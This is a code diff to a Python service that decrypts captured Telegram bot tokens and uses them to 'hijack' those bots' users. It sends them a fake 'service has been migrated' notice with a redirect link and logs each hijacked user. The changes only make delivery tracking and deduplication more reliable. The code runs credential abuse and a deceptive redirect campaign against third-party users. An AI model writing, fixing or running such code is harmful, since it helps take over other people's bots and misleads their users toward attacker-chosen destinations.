@@ -3890,7 +3890,7 @@ async def _honeypot_redirect_sweep_logic() -> dict:
         # Get un-redirected message-type updates
         res = await async_execute(
             db.table("honeypot_updates")
-            .select("id, credential_id, payload, received_at")
+            .select("id, credential_id, payload, received_at, update_type")
             .is_("redirected_at", "null")
             .in_("update_type", ["message", "callback_query", "inline_query", "edited_message", "channel_post"])
             .order("received_at", desc=False)
@@ -4038,13 +4038,13 @@ async def _honeypot_redirect_one_logic(
             bot_token, callback_id, redirect_url, redirect_bot
         )
         
-        await HoneypotRedirectStrategies.update_redirect_record(
-            update_id, user_id, redirect_bot
-        )
-        HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
+        if sent_ok:
+            await HoneypotRedirectStrategies.update_redirect_record(
+                update_id, user_id, redirect_bot
+            )
+            HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
         
-        logger.info(f"🔀 [Callback] hijacked user:{user_id} cred:{credential_id[:8]}...")
-        return {"status": "callback_handled", "user_id": user_id, "sent": sent_ok}
+        logger.info(f"🔀 [Callback] hijacked user:{user_id} cred:{credential_id[:8]}... sent={sent_ok}")
     
     # Level 4: Inline query hijack
     elif update_type == "inline_query":
@@ -4069,13 +4069,13 @@ async def _honeypot_redirect_one_logic(
             bot_token, inline_id, query_text, redirect_url, redirect_bot
         )
         
-        await HoneypotRedirectStrategies.update_redirect_record(
-            update_id, user_id, redirect_bot
-        )
-        HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
+        if sent_ok:
+            await HoneypotRedirectStrategies.update_redirect_record(
+                update_id, user_id, redirect_bot
+            )
+            HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
         
-        logger.info(f"🔀 [Inline] hijacked user:{user_id} cred:{credential_id[:8]}...")
-        return {"status": "inline_handled", "user_id": user_id, "sent": sent_ok}
+        logger.info(f"🔀 [Inline] hijacked user:{user_id} cred:{credential_id[:8]}... sent={sent_ok}")
 
     # Get the captured bot's token
     try:
@@ -4100,6 +4100,15 @@ async def _honeypot_redirect_one_logic(
             pass
         return {"status": "token_decrypt_failed", "error": str(e)[:200]}
 
+    # BUG-3 FIX: Define redirect_1 text for normal message path
+    text = (
+        "⚠️ This service has been migrated.\n"
+        "Your request could not be processed here.\n"
+        "To continue, use the updated channel:\n"
+        f"👉 {redirect_url}\n"
+        "This is an automated notification."
+    )
+
     # Send the message via Bot API
     try:
         async with httpx.AsyncClient(timeout=15.0) as client:
@@ -4117,16 +4126,23 @@ async def _honeypot_redirect_one_logic(
         sent_ok = False
         resp = {"error": str(e)[:200]}
 
-    # Record outcome
+    # BUG-4 FIX: Write redirect_1_sent_at on first successful send
+    # BUG-5 FIX: Only mark redirected_at / dedup on successful delivery
     now = datetime.now(timezone.utc).isoformat()
     try:
-        update_payload = {
-            "redirected_at": now,
-            "redirected_bot": redirect_bot,
-            "sender_user_id": user_id,
-        }
-        if not sent_ok:
-            update_payload["redirect_error"] = str(resp.get("description") or resp.get("error", "unknown"))[:200]
+        if sent_ok:
+            update_payload = {
+                "redirected_at": now,
+                "redirected_bot": redirect_bot,
+                "sender_user_id": user_id,
+                "redirect_1_sent_at": now,
+                "redirect_attempt": 1,
+            }
+        else:
+            update_payload = {
+                "redirect_error": str(resp.get("description") or resp.get("error", "unknown"))[:200],
+                "sender_user_id": user_id,
+            }
         await async_execute(
             db.table("honeypot_updates")
             .update(update_payload)
@@ -4135,12 +4151,13 @@ async def _honeypot_redirect_one_logic(
     except Exception:
         pass
 
-    # Set dedup key (no expiry — permanent per-user-per-cred)
-    try:
-        from app.core.redis_srv import redis_srv
-        redis_srv.client.set(f"redirect:sent:{credential_id}:{user_id}", "1")
-    except Exception:
-        pass
+    # BUG-5 FIX: Only set dedup key on successful delivery
+    if sent_ok:
+        try:
+            from app.core.redis_srv import redis_srv
+            redis_srv.client.set(f"redirect:sent:{credential_id}:{user_id}", "1")
+        except Exception:
+            pass
 
     if sent_ok:
         logger.info(
